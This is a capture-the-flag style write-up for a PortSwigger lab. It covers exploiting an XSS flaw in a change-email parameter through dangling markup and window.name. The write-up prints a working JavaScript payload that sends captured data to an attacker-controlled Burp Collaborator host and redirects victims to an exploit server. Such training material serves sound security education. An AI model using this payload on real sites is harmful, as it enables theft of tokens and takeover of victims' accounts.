## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/679784a2-fbd2-469c-97cb-a507fe23331a)

## Solution :

>Hint:You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit,
make sure you use a different email address for the final exploit you deliver to the victim.

Log in to the lab using the account provided above. And xxamine the change email function. Observe that there is an XSS vulnerability in the email parameter.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/eacc0323-3a17-4bef-b5fc-6fd2444c0f8d)

Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.

PAYLOAD-

```html
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

Back in the lab, go to the exploit server and add the following code, replacing YOUR-LAB-ID and YOUR-EXPLOIT-SERVER-ID with your lab ID and exploit server ID respectively, and replacing YOUR-COLLABORATOR-ID with the payload that you just copied from Burp Collaborator.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9fa33947-c9d3-449f-8c91-4c214667c181)

